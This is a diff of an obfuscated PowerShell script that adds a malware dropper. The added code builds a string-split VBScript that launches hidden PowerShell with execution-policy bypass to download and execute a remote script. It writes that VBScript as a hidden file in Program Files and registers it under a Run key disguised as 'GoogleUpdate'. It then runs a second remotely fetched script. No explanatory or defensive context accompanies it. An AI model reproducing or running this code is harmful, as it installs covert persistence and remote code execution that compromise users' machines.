@@ -35,11 +35,26 @@ $iasovosaivavspajv='tic'
 finally
 {
 
-$kdisxosdjjd='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/Updater.ps1''
+$dricksjisx='https://raw.githubusercontent.com/GOTREMOVED/main/Updater.ps1'
+
+$VBS_f_ile = @'
+ksayewnds="SheLl"
+kcwowycp="ower"
+haugwloshbv=" -w hIdDen -eX"
+hctixwichs=" bYpaSs -c"
 
 
 
+aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" $U"+"n"+"lpBj"+"Ckjw"+"i ="+" (ne"+"w-ob"+"jec"+"t "+"net.we"+"bclien"+"t); "+"IeX ($UnlpBjCkjwi.downloadstring('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib706.ps1''))"
+CreateObject("Wscript."+ksayewnds).Run aiensjd, 0, false
+'@
+Start-Sleep -s 3
+Set-Content -Path $env:ProgramFiles\cu.vbs -Value $VBS_f_ile
+attrib +h "$env:ProgramFiles\cu.vbs"
 
-$rgualnNZnZum = (new-object net.webclient); IeX ($rgualnNZnZum.downloadstring($kdisxosdjjd))
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v GoogleUpdate /t REG_EXPAND_SZ /d "%ProgramFiles%\cu.vbs"
+
+
+IEX ((new-object net.webclient).downloadstring($dricksjisx))
 
 }
